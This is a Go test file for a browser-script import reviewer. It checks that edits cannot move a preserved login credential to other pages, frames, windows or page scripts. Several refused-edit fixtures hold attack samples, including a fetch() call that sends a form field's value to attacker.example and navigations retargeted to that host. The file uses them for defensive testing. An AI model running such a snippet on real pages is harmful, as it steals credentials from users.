package importreview

import (
	"reflect"
	"sort"
	"strings"
	"testing"

	"github.com/jasonczech/apexload/pkg/dsl"
	"github.com/jasonczech/apexload/pkg/selector"
)

const browserPageRefusal = "pages or page scripts around the imported credential kept at actions["

// pageGuardScript is recorderCredentialScript opened by a navigation, with a
// scroll before the kept fill: the page flow a captured value is typed into.
func pageGuardScript(keep bool) *dsl.Script {
	script := recorderCredentialScript()
	open := dsl.Action{Name: "Open login", Type: "browser_navigate", Target: "https://app.example.test/login"}
	scroll := dsl.Action{Name: "Scroll page", Type: "browser_scroll", Params: map[string]any{"delta_y": float64(300)}}
	actions := []dsl.Action{open}
	for _, action := range script.Actions {
		if action.Name == "Fill code" {
			actions = append(actions, scroll)
			if !keep {
				// A recording that keeps nothing: the code was masked at
				// capture and is supplied at run time.
				action.Value = "{{env.CODE}}"
				action.Metadata = map[string]any{"source_masked_secret": true}
			}
		}
		actions = append(actions, action)
	}
	script.Actions = actions
	return script
}

type pageGuardCase struct {
	name  string
	setup func(*dsl.Script)
	edit  func(*dsl.Script)
}

func insertPageGuardStep(script *dsl.Script, before string, action dsl.Action) {
	at := len(script.Actions)
	for index, existing := range script.Actions {
		if existing.Name == before {
			at = index
			break
		}
	}
	script.Actions = append(script.Actions[:at], append([]dsl.Action{action}, script.Actions[at:]...)...)
}

func pageGuardStep(script *dsl.Script, name string) *dsl.Action {
	for index := range script.Actions {
		if script.Actions[index].Name == name {
			return &script.Actions[index]
		}
	}
	return nil
}

func withPageGuardMetadata(action *dsl.Action, key string, value any) {
	if action.Metadata == nil {
		action.Metadata = map[string]any{}
	}
	action.Metadata[key] = value
}

var pageGuardFallback = []any{map[string]any{"kind": "css", "value": "#search", "confidence": float64(90), "reason": "edited"}}

// runPageGuardCase applies an edit to the masked read of a fresh fixture, bare
// and with stamped step identities, the way a save or a debug start does.
func runPageGuardCase(t *testing.T, keep, stamped bool, tc pageGuardCase) (*dsl.Script, error) {
	t.Helper()
	prior := pageGuardScript(keep)
	if tc.setup != nil {
		tc.setup(prior)
	}
	if stamped {
		EnsureScriptImportActionUIDs(prior)
	}
	return reconcileRecorderEdit(t, prior, tc.edit)
}

// withPageGuardRunLogic groups the top-level steps for run logic: the sign-in
// steps by tag, and a loop that visits another page as its own group, which
// runs last.
func withPageGuardRunLogic(s *dsl.Script) {
	for index := range s.Actions {
		withPageGuardMetadata(&s.Actions[index], dsl.RunLogicActionMetadataKey, "Login")
	}
	delete(pageGuardStep(s, "Scroll page").Metadata, dsl.RunLogicActionMetadataKey)
	s.Actions = append(s.Actions, dsl.Action{Name: "Visit other", Type: "control_loop",
		Metadata: map[string]any{dsl.RunLogicActionMetadataKey: "Other"},
		Control:  &dsl.ControlFlow{Count: 1, Steps: []dsl.Action{{Name: "Go other", Type: "browser_navigate", Target: "https://other.example.test/phish"}}}})
	s.Config.RunLogic.Blocks = []dsl.RunLogicBlock{{Name: "flow", Children: []dsl.RunLogicChild{{Action: "Login"}, {Action: "Other"}}}}
}

func pageGuardRefusedCases() []pageGuardCase {
	evaluate := dsl.Action{Name: "Read field", Type: "browser_evaluate_js", Target: "fetch('https://attacker.example/?v='+document.querySelector('#code').value)"}
	return []pageGuardCase{
		{name: "navigate retargeted", edit: func(s *dsl.Script) { pageGuardStep(s, "Open login").Target = "https://attacker.example/login" }},
		{name: "navigate deleted", edit: func(s *dsl.Script) { s.Actions = s.Actions[1:] }},
		{name: "navigate inserted before the fill", edit: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Go", Type: "browser_navigate", Target: "https://attacker.example/"})
		}},
		{name: "window opened before the fill", edit: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Pop", Type: "browser_open_window", Target: "https://attacker.example/"})
		}},
		{name: "window switch inserted", edit: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Switch", Type: "browser_switch_window", Target: "1"})
		}},
		{name: "frame switch inserted", edit: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Frame", Type: "browser_switch_frame", Target: "iframe#ad"})
		}},
		{name: "page script before the fill", edit: func(s *dsl.Script) { insertPageGuardStep(s, "Fill code", evaluate) }},
		{name: "page script after the fill", edit: func(s *dsl.Script) { s.Actions = append(s.Actions, evaluate) }},
		{name: "page script in init", edit: func(s *dsl.Script) { s.Init = append(s.Init, evaluate) }},
		{name: "page script in teardown", edit: func(s *dsl.Script) { s.Teardown = append(s.Teardown, evaluate) }},
		{name: "page script with reviewed scripts allowed", edit: func(s *dsl.Script) {
			s.Config.Browser.ReviewPolicy.AllowReviewedJavaScript = true
			s.Actions = append(s.Actions, evaluate)
		}},
		{name: "fallbacks added to the kept fill", edit: func(s *dsl.Script) {
			withPageGuardMetadata(pageGuardStep(s, "Fill code"), selector.MetadataFallbacksKey, pageGuardFallback)
		}},
		{name: "candidates added to the kept fill", edit: func(s *dsl.Script) {
			withPageGuardMetadata(pageGuardStep(s, "Fill code"), selector.MetadataCandidatesKey, pageGuardFallback)
		}},
		{name: "frame selector added to the kept fill", edit: func(s *dsl.Script) {
			withPageGuardMetadata(pageGuardStep(s, "Fill code"), "frame_selector", "iframe#ad")
		}},
		{name: "frame path added to the kept fill", edit: func(s *dsl.Script) {
			withPageGuardMetadata(pageGuardStep(s, "Fill code"), "frame_path", []any{"iframe#ad"})
		}},
		{name: "fallbacks added to the click before the fill", edit: func(s *dsl.Script) {
			withPageGuardMetadata(pageGuardStep(s, "Click main"), selector.MetadataFallbacksKey, pageGuardFallback)
		}},
		{name: "decoy fill seeding self-heal", edit: func(s *dsl.Script) {
			decoy := dsl.Action{Name: "Decoy", Type: "browser_fill", Selector: "#code", Target: "#code", Value: "x",
				Metadata: map[string]any{"recorder_step_seq": float64(9), selector.MetadataFallbacksKey: pageGuardFallback}}
			insertPageGuardStep(s, "Fill code", decoy)
		}},
		{name: "click before the fill retargeted", edit: func(s *dsl.Script) {
			click := pageGuardStep(s, "Click main")
			click.Selector, click.Target = "a#elsewhere", "a#elsewhere"
		}},
		{name: "submit after the fill retargeted", edit: func(s *dsl.Script) {
			click := pageGuardStep(s, "Click Login")
			click.Selector, click.Target = "#search-submit", "#search-submit"
		}},
		{name: "check inserted", edit: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Check", Type: "browser_check", Selector: "#remember", Target: "#remember"})
		}},
		{name: "select inserted", edit: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Pick", Type: "browser_select", Selector: "#site", Target: "#site", Value: "other"})
		}},
		{name: "key press inserted", edit: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Enter", Type: "browser_press_key", Selector: "#username", Target: "#username", Value: "Enter"})
		}},
		{name: "geolocation inserted", edit: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Where", Type: "browser_set_geolocation", Params: map[string]any{"latitude": float64(1), "longitude": float64(2)}})
		}},
		{name: "fill that keeps nothing inserted", edit: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Domain", Type: "browser_fill", Selector: "#domain", Target: "#domain", Value: "other"})
		}},
		{name: "username value edited", edit: func(s *dsl.Script) { pageGuardStep(s, "Fill username").Value = "someone-else@example.test" }},
		{name: "username typed key by key", edit: func(s *dsl.Script) {
			pageGuardStep(s, "Fill username").Params = map[string]any{"input_mode": "type"}
		}},
		{name: "hover retargeted", edit: func(s *dsl.Script) {
			hover := pageGuardStep(s, "Hover")
			hover.Selector, hover.Target = "#menu-elsewhere", "#menu-elsewhere"
		}},
		{name: "hover inserted", edit: func(s *dsl.Script) { insertPageGuardStep(s, "Fill code", recorderHover("#menu")) }},
		{name: "scroll inserted", edit: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Scroll more", Type: "browser_scroll", Params: map[string]any{"delta_y": float64(900)}})
		}},
		{name: "kept fill moved before the navigation", edit: func(s *dsl.Script) {
			var fill dsl.Action
			rest := make([]dsl.Action, 0, len(s.Actions))
			for _, action := range s.Actions {
				if action.Name == "Fill code" {
					fill = action
					continue
				}
				rest = append(rest, action)
			}
			s.Actions = append([]dsl.Action{fill}, rest...)
		}},
		{name: "kept fill wrapped in a condition", edit: func(s *dsl.Script) {
			for index, action := range s.Actions {
				if action.Name == "Fill code" {
					s.Actions[index] = dsl.Action{Name: "If", Type: "control_if", Control: &dsl.ControlFlow{Condition: &dsl.Condition{Expr: "true"}, Steps: []dsl.Action{action}}}
				}
			}
		}},
		{name: "run logic added to reorder the steps", edit: func(s *dsl.Script) {
			s.Config.RunLogic.Blocks = []dsl.RunLogicBlock{{Name: "flow", Children: []dsl.RunLogicChild{
				{Action: "Click Login"}, {Action: "Fill code"}, {Action: "Open login"},
			}}}
		}},
		{name: "run logic blocks reordered", setup: withPageGuardRunLogic, edit: func(s *dsl.Script) {
			children := s.Config.RunLogic.Blocks[0].Children
			children[0], children[1] = children[1], children[0]
		}},
		{name: "a control step retagged into the sign-in group", setup: withPageGuardRunLogic, edit: func(s *dsl.Script) {
			pageGuardStep(s, "Visit other").Metadata[dsl.RunLogicActionMetadataKey] = "Login"
		}},
		{name: "a fill that keeps nothing moved to another group", setup: withPageGuardRunLogic, edit: func(s *dsl.Script) {
			pageGuardStep(s, "Fill username").Metadata[dsl.RunLogicActionMetadataKey] = "Other"
		}},
		{name: "a browser step retagged", setup: withPageGuardRunLogic, edit: func(s *dsl.Script) {
			pageGuardStep(s, "Open login").Metadata[dsl.RunLogicActionMetadataKey] = "Other"
		}},
		{name: "kept value in a seeded landing page", setup: func(s *dsl.Script) {
			s.Config.Browser.Session = &dsl.BrowserSessionConfig{Strategy: dsl.BrowserSessionStorageStatePool}
			withPageGuardMetadata(pageGuardStep(s, "Open login"), "source_url", "https://app.example.test/home?access_token=Synth-Landing-Token-0099")
		}, edit: func(s *dsl.Script) { pageGuardStep(s, "Click main").Selector = "a#elsewhere" }},
		{
			name: "parameter feeding the navigation edited",
			setup: func(s *dsl.Script) {
				s.Parameters = []dsl.Parameter{{Name: "host", Type: "list", Values: []string{"app.example.test"}, Update: "once"}}
				pageGuardStep(s, "Open login").Target = "https://{{param.host}}/login"
			},
			edit: func(s *dsl.Script) { s.Parameters[0].Values = []string{"attacker.example"} },
		},
		{
			name: "seeded session landing page edited on a wait",
			setup: func(s *dsl.Script) {
				s.Config.Browser.Session = &dsl.BrowserSessionConfig{Strategy: dsl.BrowserSessionStorageStatePool}
				s.Actions = append([]dsl.Action{{Name: "Landed", Type: "browser_wait", WaitFor: &dsl.WaitCondition{Type: "duration", Value: "1s"},
					Metadata: map[string]any{"source_url": "https://app.example.test/home"}}}, s.Actions...)
			},
			edit: func(s *dsl.Script) { s.Actions[0].Metadata["source_url"] = "https://attacker.example/home" },
		},
	}
}

func TestRecorderEditKeepsCredentialPagePinned(t *testing.T) {
	for _, stamped := range []bool{false, true} {
		for _, tc := range pageGuardRefusedCases() {
			name := tc.name
			if stamped {
				name += " (stamped)"
			}
			t.Run(name, func(t *testing.T) {
				_, err := runPageGuardCase(t, true, stamped, tc)
				if err == nil {
					t.Fatal("edit accepted, want the page flow around the kept value pinned")
				}
				// Some edits are already refused by an earlier, stricter rule
				// (a copied or moved kept value). Every one must be refused,
				// and none may quote the value.
				if strings.Contains(err.Error(), recorderKeptValue) {
					t.Fatalf("refusal quotes the kept value: %v", err)
				}
			})
		}
	}
}

// The page-flow refusal names itself and the first changed step.
func TestRecorderEditPageRefusalNamesTheChange(t *testing.T) {
	_, err := runPageGuardCase(t, true, false, pageGuardRefusedCases()[0])
	if err == nil || !strings.Contains(err.Error(), browserPageRefusal) || !strings.Contains(err.Error(), "first change at actions[0]") {
		t.Fatalf("err = %v, want the page-flow refusal naming actions[0]", err)
	}
}

func pageGuardAcceptedCases() []pageGuardCase {
	return []pageGuardCase{
		{name: "hovers, a masked fill and init deleted; headed with screenshots", edit: func(s *dsl.Script) {
			kept := s.Actions[:0]
			for _, action := range s.Actions {
				if action.Type == "browser_hover" || action.Name == "Fill password" {
					continue
				}
				kept = append(kept, action)
			}
			s.Actions = kept
			s.Init = nil
			headed := false
			s.Config.Browser.Headless = &headed
			s.Config.Browser.CaptureScreenshots = "on_error"
		}},
		{name: "username fill deleted", edit: func(s *dsl.Script) {
			kept := s.Actions[:0]
			for _, action := range s.Actions {
				if action.Name != "Fill username" {
					kept = append(kept, action)
				}
			}
			s.Actions = kept
		}},
		{name: "scroll deleted", edit: func(s *dsl.Script) {
			kept := s.Actions[:0]
			for _, action := range s.Actions {
				if action.Type != "browser_scroll" {
					kept = append(kept, action)
				}
			}
			s.Actions = kept
		}},
		{name: "waits and a screenshot added", edit: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Settle", Type: "browser_wait", WaitFor: &dsl.WaitCondition{Type: "duration", Value: "1s"}})
			insertPageGuardStep(s, "Click Login", dsl.Action{Name: "Wait login", Type: "browser_wait_response", Target: "/login"})
			s.Actions = append(s.Actions, dsl.Action{Name: "Shot", Type: "browser_screenshot"})
		}},
		{name: "every step renamed and think time cleared", edit: func(s *dsl.Script) {
			for index := range s.Actions {
				s.Actions[index].Name += " (renamed)"
				s.Actions[index].ThinkTime = dsl.ThinkTimeConfig{}
				s.Actions[index].ThinkTimeAfter = false
			}
		}},
		{name: "browser display and evidence settings", edit: func(s *dsl.Script) {
			s.Config.Browser.HARCapture = "always"
			s.Config.Browser.Viewport = dsl.BrowserViewport{Width: 1280, Height: 800}
			s.Config.Browser.DeviceProfile = "iPhone 14"
			s.Config.Browser.Locale = "fr-FR"
			s.Config.Browser.SlowMoMs = 50
		}},
		{name: "a hover whose recorded page is masked deleted", setup: func(s *dsl.Script) {
			insertPageGuardStep(s, "Fill code", dsl.Action{Name: "Hover echo", Type: "browser_hover", Selector: "#echo", Target: "#echo",
				Metadata: map[string]any{"source_url": "https://app.example.test/x?access_token=Synth-Echo-Token-0077"}})
		}, edit: func(s *dsl.Script) {
			kept := s.Actions[:0]
			for _, action := range s.Actions {
				if action.Name != "Hover echo" {
					kept = append(kept, action)
				}
			}
			s.Actions = kept
		}},
		{name: "iterations edited", edit: func(s *dsl.Script) { s.Config.RunLogic.Iterations = 3 }},
		{name: "run logic present, a hover deleted inside a group", setup: func(s *dsl.Script) {
			withPageGuardRunLogic(s)
			loop := pageGuardStep(s, "Visit other")
			loop.Control.Steps = append([]dsl.Action{recorderHover("#menu")}, loop.Control.Steps...)
		}, edit: func(s *dsl.Script) {
			loop := pageGuardStep(s, "Visit other")
			loop.Control.Steps = loop.Control.Steps[1:]
		}},
		{name: "run logic present, a step outside its groups renamed", setup: withPageGuardRunLogic, edit: func(s *dsl.Script) {
			pageGuardStep(s, "Scroll page").Name = "Scroll down"
		}},
		{
			name: "parameter no step reads edited",
			setup: func(s *dsl.Script) {
				s.Parameters = []dsl.Parameter{{Name: "region", Type: "list", Values: []string{"west"}, Update: "once"}}
			},
			edit: func(s *dsl.Script) { s.Parameters[0].Values = []string{"east"} },
		},
	}
}

func assertKeptValueOnlyOnCode(t *testing.T, script *dsl.Script) {
	t.Helper()
	found := false
	for _, actions := range [][]dsl.Action{script.Init, script.Actions, script.Teardown} {
		for _, action := range actions {
			holds := strings.Contains(action.Value, recorderKeptValue)
			if holds && !strings.HasPrefix(action.Name, "Fill code") {
				t.Fatalf("kept value restored into %q", action.Name)
			}
			found = found || holds
		}
	}
	if !found {
		t.Fatal("kept value was not restored onto its fill")
	}
}

func TestRecorderEditAllowsHarmlessEditsAroundKeptCredential(t *testing.T) {
	for _, stamped := range []bool{false, true} {
		for _, tc := range pageGuardAcceptedCases() {
			name := tc.name
			if stamped {
				name += " (stamped)"
			}
			t.Run(name, func(t *testing.T) {
				candidate, err := runPageGuardCase(t, true, stamped, tc)
				if err != nil {
					t.Fatalf("edit refused: %v", err)
				}
				assertKeptValueOnlyOnCode(t, candidate)
			})
		}
	}
}

// A recording that keeps no captured value, the common case, keeps every edit:
// the page-flow pin only exists to protect a kept value.
// Under run logic, two identical pinned steps that trade groups change the
// order the kept value meets its pages, though every step stays the same.
func TestRecorderEditRunLogicGroupsKeepStepOrder(t *testing.T) {
	setup := func(s *dsl.Script) {
		phish := dsl.Action{Name: "B", Type: "browser_navigate", Target: "https://other.example.test/phish"}
		fill := *pageGuardStep(s, "Fill code")
		fill.Name = "A"
		s.Actions = []dsl.Action{{Name: "G0", Type: "browser_navigate", Target: "https://app.example.test/login"}, phish, fill, phish}
		s.Actions[3].Name = "A"
		s.Config.RunLogic.Blocks = []dsl.RunLogicBlock{{Name: "flow", Children: []dsl.RunLogicChild{{Action: "G0"}, {Action: "A"}, {Action: "B"}}}}
	}
	for _, stamped := range []bool{false, true} {
		_, err := runPageGuardCase(t, true, stamped, pageGuardCase{setup: setup, edit: func(s *dsl.Script) {
			s.Actions[1].Name, s.Actions[3].Name = "A", "B"
		}})
		if err == nil {
			t.Fatalf("stamped=%v: swapping identical steps between run-logic groups was accepted", stamped)
		}
	}
}

// Under a seeded session a kept value in a step's recorded page is opened, so
// it holds the page flow even when nothing else is kept.
func TestRecorderEditSeededLandingValueHoldsPageFlow(t *testing.T) {
	setup := func(s *dsl.Script) {
		s.Config.Browser.Session = &dsl.BrowserSessionConfig{Strategy: dsl.BrowserSessionStorageStatePool}
		withPageGuardMetadata(pageGuardStep(s, "Open login"), "source_url", "https://app.example.test/home?access_token=Synth-Landing-Token-0099")
	}
	retarget := func(s *dsl.Script) { pageGuardStep(s, "Click main").Selector = "a#elsewhere" }
	if !strings.Contains(MaskScriptSecrets(func() *dsl.Script { p := pageGuardScript(false); setup(p); return p }()).Actions[0].Metadata["source_url"].(string), MaskedScriptSecret) {
		t.Skip("the masked read no longer hides this token")
	}
	if _, err := runPageGuardCase(t, false, false, pageGuardCase{setup: setup, edit: retarget}); err == nil {
		t.Fatal("seeded landing value: page-flow edit accepted")
	}
	unseeded := func(s *dsl.Script) {
		withPageGuardMetadata(pageGuardStep(s, "Open login"), "source_url", "https://app.example.test/home?access_token=Synth-Landing-Token-0099")
	}
	if _, err := runPageGuardCase(t, false, false, pageGuardCase{setup: unseeded, edit: retarget}); err != nil {
		t.Fatalf("without a seeded session the recorded page is not opened, edit refused: %v", err)
	}
}

func TestRecorderEditPageRuleNeedsKeptCredential(t *testing.T) {
	names := map[string]bool{
		"navigate retargeted": true, "page script after the fill": true, "page script in init": true,
		"page script in teardown": true, "hover retargeted": true, "username value edited": true,
		"frame switch inserted": true, "window opened before the fill": true, "fill that keeps nothing inserted": true,
	}
	for _, tc := range pageGuardRefusedCases() {
		if !names[tc.name] {
			continue
		}
		t.Run(tc.name, func(t *testing.T) {
			if _, err := runPageGuardCase(t, false, false, tc); err != nil {
				t.Fatalf("edit refused on a recording that keeps nothing: %v", err)
			}
		})
	}
}

// The admin transport option relaxes proxy and TLS edits only, never the page
// flow around a kept browser value.
func TestBrowserPageRuleIgnoresTransportRouteOption(t *testing.T) {
	prior := pageGuardScript(true)
	candidate := MaskScriptSecrets(prior)
	pageGuardStep(candidate, "Open login").Target = "https://attacker.example/login"
	if err := ReconcileMaskedScriptSecretsWithTrust(candidate, prior, false); err != nil {
		t.Fatal(err)
	}
	err := ValidatePreservedImportCredentialEditsWithOptions(candidate, prior, PreservedImportEditOptions{AllowTransportRouteEdits: true})
	if err == nil || !strings.Contains(err.Error(), browserPageRefusal) {
		t.Fatalf("err = %v, want the page-flow refusal", err)
	}
}

// A value the masked read hides in a window switch's URL or in step metadata
// is never typed into a page, so the page flow around it stays editable:
// deleting the recorded redirect navigations of a sign-in, for example.
func TestRecorderEditPageRuleSkipsValuesNoPageReceives(t *testing.T) {
	prior := pageGuardScript(false)
	insertPageGuardStep(prior, "Click Login", dsl.Action{Name: "Switch", Type: "browser_switch_window",
		Target: "https://sso.example.test/login?access_token=Synth-Window-Token-0042"})
	masked := MaskScriptSecrets(prior)
	if !strings.Contains(pageGuardStep(masked, "Switch").Target, MaskedScriptSecret) {
		t.Skip("the masked read no longer hides this window URL's token; the case needs another kept value")
	}
	candidate, err := reconcileRecorderEdit(t, prior, func(s *dsl.Script) { s.Actions = s.Actions[1:] })
	if err != nil {
		t.Fatalf("deleting the navigation was refused: %v", err)
	}
	if !strings.Contains(pageGuardStep(candidate, "Switch").Target, "Synth-Window-Token-0042") {
		t.Fatal("the window URL was not restored")
	}
	if _, err := reconcileRecorderEdit(t, prior, func(s *dsl.Script) {
		pageGuardStep(s, "Switch").Target = "https://attacker.example/?access_token=" + MaskedScriptSecret
	}); err == nil {
		t.Fatal("retargeting the window URL that holds the kept value was accepted")
	}
}

func TestImportBrowserPageStepClassesCoverCatalog(t *testing.T) {
	var catalog []string
	known := map[string]bool{}
	for _, spec := range dsl.AllActionSpecs() {
		known[spec.Type] = true
		if strings.HasPrefix(spec.Type, "browser_") {
			catalog = append(catalog, spec.Type)
		}
	}
	classified := make([]string, 0, len(browserStepClasses))
	for kind := range browserStepClasses {
		classified = append(classified, kind)
	}
	sort.Strings(catalog)
	sort.Strings(classified)
	if !reflect.DeepEqual(catalog, classified) {
		t.Fatalf("browser_* catalog types %v, classified %v: give every browser step a class", catalog, classified)
	}
	for kind := range engineInertStepTypes {
		if !known[kind] {
			t.Fatalf("engine inert step %q is not in the catalog", kind)
		}
	}
}

func TestImportActionWireContextKeepsBrowserRuntimeMetadata(t *testing.T) {
	fill := map[string]any{"type": "browser_fill", "selector": "#code", "metadata": map[string]any{
		selector.MetadataFallbacksKey: pageGuardFallback, "frame_selector": "iframe#login",
		"source_masked_secret": true, "note": "provenance",
	}}
	context := ImportActionWireContext(fill)
	held, _ := context["metadata"].(map[string]any)
	if len(held) != 3 || held["frame_selector"] != "iframe#login" || held[selector.MetadataFallbacksKey] == nil || held["source_masked_secret"] != true {
		t.Fatalf("browser context metadata = %#v, want only the runtime-read keys", context["metadata"])
	}
	request := map[string]any{"type": "request", "target": "/x", "metadata": map[string]any{"frame_selector": "iframe#x"}}
	if _, exists := ImportActionWireContext(request)["metadata"]; exists {
		t.Fatal("an HTTP step's metadata entered its context")
	}
}

func TestAlignBrowserPageSteps(t *testing.T) {
	step := func(path string, droppable bool, id string) browserPageStep {
		return browserPageStep{path: path, droppable: droppable, entry: map[string]any{"context": id}}
	}
	prior := []browserPageStep{step("/actions/0", false, "nav"), step("/actions/1", true, "hover"), step("/actions/2", true, "hover"), step("/actions/3", false, "fill")}
	tests := []struct {
		name      string
		candidate []browserPageStep
		changed   bool
	}{
		{"unchanged", prior, false},
		{"a droppable deleted", []browserPageStep{prior[0], prior[2], prior[3]}, false},
		{"equal droppables deleted", []browserPageStep{prior[0], prior[3]}, false},
		{"a pinned deleted", []browserPageStep{prior[1], prior[2], prior[3]}, true},
		{"an insertion", []browserPageStep{prior[0], step("/actions/1", true, "new"), prior[1], prior[2], prior[3]}, true},
		{"a swap", []browserPageStep{prior[3], prior[1], prior[2], prior[0]}, true},
	}
	for _, tt := range tests {
		pairs, _, changed := alignBrowserPageSteps(tt.candidate, prior)
		if changed != tt.changed {
			t.Errorf("%s: changed = %v, want %v", tt.name, changed, tt.changed)
		}
		if !changed && len(pairs) != len(tt.candidate) {
			t.Errorf("%s: pairs = %v, want one per candidate step", tt.name, pairs)
		}
	}
	signIn := browserPageStep{entry: map[string]any{"sign_in": nil}}
	pairs, _, changed := alignBrowserPageSteps([]browserPageStep{signIn}, []browserPageStep{signIn})
	if changed || len(pairs) != 1 || pairs[0][0] != "" {
		t.Fatalf("sign-in entry pairs = %v changed=%v, want one unpathed pair", pairs, changed)
	}
}
